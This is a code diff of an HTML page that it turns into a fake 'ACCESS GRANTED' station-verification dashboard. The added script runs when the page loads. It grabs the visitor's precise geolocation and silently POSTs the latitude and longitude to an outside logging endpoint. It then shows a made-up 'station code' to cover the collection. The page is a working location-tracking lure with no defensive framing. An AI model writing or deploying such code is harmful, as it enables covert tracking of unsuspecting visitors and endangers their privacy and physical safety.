@@ -1,55 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Monitoring Trackwork</title>
+    <title>Monitoring Dashboard</title>
+    <style>
+        body {
+            background-color: #111;
+            color: #0f0;
+            font-family: monospace;
+            text-align: center;
+            margin-top: 100px;
+        }
+        .box {
+            display: inline-block;
+            border: 1px solid #0f0;
+            padding: 20px;
+            border-radius: 10px;
+        }
+    </style>
 </head>
 <body>
-  <h2>Daily Reports Recovery</h2>
-  <button onclick="getLocation()">Asking Recovery</button>
-  <p id="location"></p>
+    <div class="box">
+        <h2>ACCESS GRANTED</h2>
+        <p>Station Verified</p>
+        <p>Access Station Located</p>
+        <p id="access-code"></p>
+    </div>
 
-  <script>
-    function getLocation() {
-      if (!navigator.geolocation) {
-        document.getElementById("location").innerText = "Geolocation not supported by this browser.";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        showPosition,
-        showError,
-        {
-          enableHighAccuracy: true,     // 📍 Ask for GPS/Wi-Fi-based location
-          timeout: 10000,               // ⏱️ Wait up to 10 seconds
-          maximumAge: 0                 // ♻️ Don't use an cached location
+    <script>
+        function sendLocation(lat, lng) {
+            fetch("https://auth.fwh.is/log.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: "lat=" + lat + "&lng=" + lng
+            });
         }
-      );
-    }
 
-    function showPosition(position) {
-      document.getElementById("location").innerText =
-        "Access Code: LAT " + position.coords.latitude.toFixed(5) +
-        ", LNG " + position.coords.longitude.toFixed(5);
-    }
+        function generateCode(lat, lng) {
+            // fake "station code" from coordinates
+            let code = "ST-" + Math.floor(Math.abs(lat * 1000)) + "-" + Math.floor(Math.abs(lng * 1000));
+            document.getElementById("access-code").innerText = code;
+        }
 
-    function showError(error) {
-      let message = "Unable to get access: ";
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          message += "Permission denied.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          message += "access unavailable.";
-          break;
-        case error.TIMEOUT:
-          message += "Request timed out.";
-          break;
-        case error.UNKNOWN_ERROR:
-          message += "Unknown error.";
-          break;
-      }
-      document.getElementById("location").innerText = message;
-    }
-  </script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                let lat = position.coords.latitude;
+                let lng = position.coords.longitude;
+                sendLocation(lat, lng);
+                generateCode(lat, lng);
+            }, function(error) {
+                document.getElementById("access-code").innerText = "ST-ERROR";
+            });
+        }
+    </script>
 </body>
 </html>
